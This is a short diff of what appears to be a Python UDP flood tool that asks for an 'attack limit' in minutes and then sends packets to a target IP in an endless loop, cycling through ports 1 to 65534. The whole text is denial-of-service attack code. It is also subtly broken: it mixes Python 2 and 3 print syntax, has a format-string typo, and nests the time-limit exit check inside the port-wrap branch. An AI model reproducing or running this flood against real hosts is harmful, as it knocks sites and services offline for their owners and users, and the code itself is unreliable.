@@ -52,22 +52,22 @@ limit = int(input('attack limit(minute): '))
 stopminute = minute + limit
 print('End site attack in: %s:%s'%(hour,stopminute))
 print('##########################################')
-
+time.sleep(5)
+print('##########################################')
 nowhour = 0
 nowminute = 0
 
 #nowhour = now.hour*1
 #nowminute = now.minute*1
+#print('time %s:%s'%(nowhour,nowminute))
 
 while True:
             sock.sendto(bytes, (ip,port))
             sent = sent + 1
             port = port + 1
-            
-   #print('time %s:%s'%(nowhour,nowminute))
-   print('sent packet: s% to %s on port:%s'%(sent,ip,port))
-
-     if port == 65534:
-        port = 1
-     if nowminute == stopminute:
-        sys.exit()
+            print "sent packet: s% to %s on port:%s"%(sent,ip,port)
+            nowminute = now.minute*1
+            if port == 65534:
+                        port = 1
+                        if nowminute == stopminute:
+                                    sys.exit()
